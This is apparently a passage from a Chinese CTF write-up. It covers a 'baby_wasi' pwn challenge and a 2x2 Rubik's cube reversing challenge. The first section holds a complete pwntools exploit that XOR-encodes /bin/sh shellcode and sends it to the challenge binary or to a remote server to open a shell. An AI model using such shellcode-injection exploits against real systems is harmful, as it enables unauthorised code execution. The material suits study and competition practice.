<span class="n">dest</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="mh">0x1000uLL</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>    
<span class="n">v5</span> <span class="o">=</span> <span class="n">wasmer_instance_context_memory</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>    
<span class="n">v6</span> <span class="o">=</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="n">wasmer_memory_data</span><span class="p">(</span><span class="n">v5</span><span class="p">)</span> <span class="o">+</span> <span class="n">a2</span><span class="p">);</span>    
<span class="n">memcpy</span><span class="p">(</span><span class="n">dest</span><span class="p">,</span> <span class="n">v6</span><span class="p">,</span> <span class="n">v3</span><span class="p">);</span>    
<span class="k">return</span> <span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">void</span> <span class="o">*</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">))</span><span class="n">dest</span><span class="p">)(</span><span class="n">dest</span><span class="p">,</span> <span class="n">v6</span><span class="p">);</span>    
<span class="p">}</span>    
</code></pre></td></tr></table>
</div>
</div><p>可以看到boom函数直接执行了输入后异或的代码,简单来说就是我们输入一个长度小于64的字符串，然后程序把这个字符串异或以后执行，所以我们需要传入一段经过异或的shell，程序就可以执行这个shell了。异或的部分根据wp来看是key[i]=emirp[lucky_nubmer + i] % 256, emirp 即为反素数序列，可以参考：https://oeis.org/A006567 我们可以直接还原代码对shell异或</p>
<h3 id="exp">exp</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>    
<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>    
<span class="c1">#context.terminal=[&#39;tmux&#39;,&#39;split&#39;,&#39;-h&#39;]    </span>
<span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">)</span>    
<span class="n">debug</span> <span class="o">=</span> <span class="mi">1</span>    
    
<span class="k">def</span> <span class="nf">prime_test</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>    
<span class="k">if</span> <span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span> <span class="ow">and</span> <span class="n">n</span> <span class="o">%</span> <span class="mi">3</span> <span class="p">:</span>    
    <span class="n">v3</span> <span class="o">=</span> <span class="mi">7</span>    
    <span class="k">while</span> <span class="p">(</span><span class="n">v3</span> <span class="o">-</span> <span class="mi">6</span><span class="p">)</span> <span class="o">**</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>    
        <span class="k">if</span> <span class="n">n</span> <span class="o">%</span> <span class="p">(</span><span class="n">v3</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="p">:</span>    
            <span class="n">v1</span> <span class="o">=</span> <span class="n">n</span> <span class="o">%</span> <span class="n">v3</span>    
            <span class="n">v3</span> <span class="o">+=</span> <span class="mi">6</span>    
            <span class="k">if</span> <span class="n">v1</span><span class="p">:</span>    
                <span class="k">continue</span>    
        <span class="k">return</span> <span class="mi">0</span>    
    <span class="k">return</span> <span class="mi">1</span>    
<span class="k">return</span> <span class="mi">0</span>    
    
<span class="k">def</span> <span class="nf">invsere_decimal</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>    
<span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>    
    
<span class="k">def</span> <span class="nf">is_prime</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>    
<span class="n">v3</span> <span class="o">=</span> <span class="n">invsere_decimal</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>    
<span class="k">if</span> <span class="n">v3</span> <span class="o">!=</span> <span class="n">x</span> <span class="ow">and</span> <span class="n">prime_test</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>    
    <span class="k">return</span> <span class="n">prime_test</span><span class="p">(</span><span class="n">v3</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span>    
<span class="k">return</span> <span class="bp">False</span>    
    
<span class="k">def</span> <span class="nf">next_prime</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>    
<span class="n">v3</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span>    
<span class="k">while</span> <span class="n">v4</span> <span class="o">&lt;</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span>    
    <span class="n">v6</span> <span class="o">=</span> <span class="n">is_prime</span><span class="p">(</span><span class="n">v3</span><span class="p">)</span>    
    <span class="k">if</span> <span class="n">v6</span><span class="p">:</span>    
        <span class="n">v1</span> <span class="o">=</span> <span class="n">v3</span>    
    <span class="k">else</span><span class="p">:</span>    
        <span class="n">v1</span> <span class="o">=</span> <span class="n">v5</span>    
    
    <span class="n">v5</span> <span class="o">=</span> <span class="n">v1</span>    
    <span class="n">v3</span> <span class="o">=</span> <span class="n">v3</span> <span class="o">+</span> <span class="mi">1</span>    
    <span class="k">if</span> <span class="n">v6</span><span class="p">:</span>    
        <span class="n">v4</span> <span class="o">+=</span> <span class="mi">1</span>    
<span class="k">return</span> <span class="n">v5</span>    
    
<span class="k">def</span> <span class="nf">payload_encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">lck_n</span><span class="p">):</span>    
<span class="k">print</span> <span class="s1">&#39;lck:</span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">lck_n</span>    
<span class="n">rtn</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)):</span>    
    <span class="n">c</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">payload</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="p">(</span><span class="n">next_prime</span><span class="p">(</span><span class="n">lck_n</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>    
    <span class="n">lck_n</span> <span class="o">+=</span> <span class="mi">1</span>    
    <span class="n">rtn</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>    
<span class="k">return</span> <span class="n">rtn</span>    
    
<span class="k">if</span> <span class="n">debug</span><span class="p">:</span>    
<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./baby_wasi&#39;</span><span class="p">)</span>    
<span class="k">else</span><span class="p">:</span>    
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;121.37.164.32&#39;</span><span class="p">,</span> <span class="mi">19008</span><span class="p">)</span>    
    
<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>    
<span class="c1">#gdb.attach(p, &#39;b boom&#39;)    </span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&#34;Your lucky number: &#34;</span><span class="p">)</span>    
<span class="n">lckn</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">())</span>    
<span class="c1">#payload = &#39;\xff&#39; * 64    </span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">())</span>    
<span class="k">print</span> <span class="s2">&#34;[+]payload plain: &#34;</span><span class="o">+</span><span class="n">payload</span>    
<span class="n">payload</span> <span class="o">=</span> <span class="n">payload_encode</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="n">lckn</span><span class="p">)</span>    
<span class="k">print</span> <span class="s1">&#39;[+] payload len: </span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>    
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>    
<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>    
    
<span class="n">s</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s1">&#39;wait for gdb&#39;</span><span class="p">)</span>    
<span class="n">exp</span><span class="p">()</span>    
</code></pre></td></tr></table>
</div>
</div><h2 id="rubik魔方">Rubik(魔方)</h2>
<p>题目是Rubik加上提供了URF三种操作，所以是一个魔方题。然后魔方的状态使用最多9个字节描述，说明是一个2*2的魔方(3*3的魔方至少需要21个字节描述)   <br>
<a href="https://rubiks-cube-solver.com/2x2/" target="_blank" rel="noopener noreffer">在线魔方求解器</a>   <br>
<a href="https://github.com/hkociemba/Rubiks2x2x2-OptimalSolver" target="_blank" rel="noopener noreffer">OptimalSolver-Nu1L</a>  <br>
<a href="https://github.com/MeepMoop/py222" target="_blank" rel="noopener noreffer">py222-Helica</a>   <br>
我感觉helica这个魔方求解器的逻辑要简单一些(Nu1L给的魔方求解器能求出来一些py222不能给的解法),所以我还是用了师父给的,毕竟我研究了挺久只会这个&hellip;</p>
<h3 id="22魔方简介">2*2魔方简介</h3>
<p>首先一个标准的魔方是如下结构的：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">   ┌──┬──┐    
   │ 0│ 1│    
   ├──┼──┤    
   │ 2│ 3│    
 ┌──┬──┼──┼──┼──┬──┬──┬──┐    
 │16│17│ 8│ 9│ 4│ 5│20│21│    
 ├──┼──┼──┼──┼──┼──┼──┼──┤    
 │18│19│10│11│ 6│ 7│22│23│    
 └──┴──┼──┼──┼──┴──┴──┴──┘    
   │12│13│    
   ├──┼──┤    
   │14│15│    
   └──┴──┘    
</code></pre></td></tr></table>
</div>
</div><p>一个魔方分为UDFBRL六个面，按照上面这个标准的魔方展开图来说，891011这个面是F面，0123这个面是U面，4567这个面是R面，然后FUR这三个操作就是分别对应这三个面做顺时针旋转操作(F2指对F面顺时针旋转两次, F&rsquo;指对F面逆时针旋转一次)</p>
<h3 id="py222用法">py222用法</h3>
<p>solver.py里面给出了求解的调用过程</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#doAlgStr(state, move)表示对处于state的魔方进行move操作    </span>
<span class="n">s</span> <span class="o">=</span> <span class="n">py222</span><span class="o">.</span><span class="n">doAlgStr</span><span class="p">(</span><span class="n">py222</span><span class="o">.</span><span class="n">initState</span><span class="p">(),</span> <span class="s2">&#34;R U2 R2 F2 R&#39; F2 R F R&#34;</span><span class="p">)</span>    
<span class="c1">#打印进行上述操作后的魔方状态    </span>
<span class="n">py222</span><span class="o">.</span><span class="n">printCube</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
<span class="c1">#求解,输入s是一个长度为24的整数数组，    </span>
<span class="n">solveCube</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
</code></pre></td></tr></table>
</div>
</div><h3 id="魔方还原">魔方还原</h3>
<p>明白是一个2*2的魔方之后，主要的难点在于给的状态并不是按照标准魔方状态给的,就是给的9字节状态，转成24长度的数组后，数组的0123位并不对于上面给的魔方标准状态的0123位置,为了还原位置我们需要记录对标准魔方分别做URF后的状态。题目中给的标准状态数字是0xB6D9246DB492249,我们在旋转魔方操作之前将表示状态的内存中的数字修改为0xB6D9246DB492249，然后分别做URF操作，记录操作后的状态</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">x /2xg addr //按照16进制打印addr处的内容<span class="o">(</span>一个g是8字节<span class="o">)</span>    
    
<span class="nb">set</span> <span class="o">{</span>long<span class="o">}</span><span class="nv">addr</span> <span class="o">=</span> 0xB6D9246DB492249 //修改addr处的内容    
</code></pre></td></tr></table>
</div>
</div><p>用下面程序还原分别做URF操作后魔方的状态</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">printc</span><span class="p">(</span><span class="n">c</span><span class="p">):</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>    
    <span class="k">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">c</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="p">]),</span><span class="n">end</span><span class="o">=</span><span class="s2">&#34; &#34;</span><span class="p">)</span>    
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>    
<span class="k">def</span> <span class="nf">change_format</span><span class="p">(</span><span class="n">b</span><span class="p">):</span>    
<span class="n">buf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">72</span><span class="p">):</span>    
    <span class="n">buf</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bool</span><span class="p">(((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">b</span><span class="p">)))</span>    
<span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>    
    
<span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)):</span>    
    <span class="n">s</span> <span class="o">+=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>    
    <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">3</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>    
        <span class="n">s</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span>    
<span class="c1"># print(s)    </span>
<span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>    
<span class="n">t</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">24</span>    
    
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>    
    <span class="n">tmp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>    
    <span class="n">t</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span>    
<span class="k">return</span> <span class="n">t</span>    
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;init&#34;</span><span class="p">)</span>    
<span class="n">c</span> <span class="o">=</span>  <span class="n">change_format</span><span class="p">(</span><span class="mh">0xB6D9246DB492249</span><span class="p">)</span>    
<span class="n">printc</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>    
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;after U&#34;</span><span class="p">)</span>    
<span class="n">c</span> <span class="o">=</span>  <span class="n">change_format</span><span class="p">(</span><span class="mh">0x0a4db646db912291</span><span class="p">)</span>    
<span class="n">printc</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>    
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;after R&#34;</span><span class="p">)</span>    
<span class="n">c</span> <span class="o">=</span>  <span class="n">change_format</span><span class="p">(</span><span class="mh">0x900b6d8dc64b492009</span><span class="p">)</span>    
<span class="n">printc</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>    
<span class="k">print</span><span class="p">(</span><span class="s2">&#34;after F&#34;</span><span class="p">)</span>    
<span class="n">c</span> <span class="o">=</span>  <span class="n">change_format</span><span class="p">(</span><span class="mh">0x09002d924b5b4da249</span><span class="p">)</span>    
<span class="n">printc</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>    
<span class="s2">&#34;&#34;&#34;    
</span><span class="s2">init    
</span><span class="s2">0000 5555 4444 3333 2222 1111    
</span><span class="s2">    
</span><span class="s2">after U    
</span><span class="s2">0000 5115 5544 3333 4422 1221    
</span><span class="s2">    
</span><span class="s2">after R    
</span><span class="s2">4400 5555 4334 3113 2222 0011    
</span><span class="s2">    
</span><span class="s2">after F    
</span><span class="s2">0220 0055 4444 5533 2332 1111    
</span><span class="s2">&#34;&#34;&#34;</span>    
</code></pre></td></tr></table>
</div>
</div><p>根据上面的结果可以按照字符串顺序还原出这个魔方对应的状态</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">   ┌──┬──┐    
   │15│14│    
   ├──┼──┤    
   │12│13│    
 ┌──┬──┼──┼──┼──┬──┬──┬──┐    
 │ 6│ 5│22│21│17│16│ 9│ 8│    
 ├──┼──┼──┼──┼──┼──┼──┼──┤    
 │ 7│ 4│23│20│18│19│10│11│    
 └──┴──┼──┼──┼──┴──┴──┴──┘    
   │ 2│ 1│    
   ├──┼──┤    
   │ 3│ 0│    
   └──┴──┘    
</code></pre></td></tr></table>
</div>
</div><p>也就是说，字符串中第0个位置对应py222给出的标准魔方的第15个位置，字符串中第1个位置对应py222给出的标准魔方的第13个位置   <br>
然后我们根据字符的顺序，将这些字符填入它们在标准魔方中的对应位置后求解</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">py222</span>    
<span class="kn">import</span> <span class="nn">solver</span>    
    
<span class="k">def</span> <span class="nf">change_format</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>    
<span class="n">buf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>        
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>    
    <span class="n">buf</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bool</span><span class="p">(((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">b</span><span class="p">)))</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>    
    <span class="n">buf</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s1">&#39;0&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bool</span><span class="p">(((</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="n">i</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">a</span><span class="p">)))</span>    
<span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>  <span class="c1">#每三比特表示一个面的状态    </span>
    
<span class="n">s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>    
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)):</span>    
    <span class="n">s</span> <span class="o">+=</span> <span class="n">buf</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>    
    <span class="k">if</span> <span class="n">i</span><span class="o">%</span><span class="mi">3</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>    
        <span class="n">s</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span>    
<span class="k">print</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>    
<span class="n">s</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)</span>    
<span class="n">t</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">24</span>    
    
<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>    
    <span class="n">tmp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">x</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>    
    <span class="n">t</span><span class="p">[</span><span class="n">x</span><span class="p">]</span> <span class="o">=</span> <span class="n">tmp</span>    
<span class="n">tbl</span> <span class="o">=</span> <span class="p">[</span><span class="mi">15</span><span class="p">,</span> <span class="mi">13</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">19</span><span class="p">,</span> <span class="mi">17</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">18</span><span class="p">,</span> <span class="mi">21</span><span class="p">,</span> <span class="mi">20</span><span class="p">,</span> <span class="mi">22</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">10</span><span class="p">]</span>    
<span class="n">ns</span> <span class="o">=</span> <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">*</span> <span class="mi">24</span>    
    
<span class="k">for</span> <span class="n">pos</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">24</span><span class="p">):</span>    
    <span class="n">ns</span><span class="p">[</span><span class="n">tbl</span><span class="p">[</span><span class="n">pos</span><span class="p">]]</span> <span class="o">=</span> <span class="n">t</span><span class="p">[</span><span class="n">pos</span><span class="p">]</span>    
    
<span class="k">return</span> <span class="n">ns</span>    
    
<span class="n">c</span> <span class="o">=</span>  <span class="n">change_format</span><span class="p">(</span><span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x00cd0d496d3132d2</span><span class="p">)</span>  <span class="c1">#初始状态,第一个参数是最高字节,第二个参数是低8字节    </span>
<span class="k">print</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>    
    
<span class="n">solver</span><span class="o">.</span><span class="n">solveCube</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>    
    
<span class="s2">&#34;&#34;&#34;    
</span><span class="s2">R F&#39; R F R&#39; F U&#39; F&#39;    
</span><span class="s2">题目中没有定义F2,F&#39;这些操作,F2就是FF,F&#39;就是FFF    
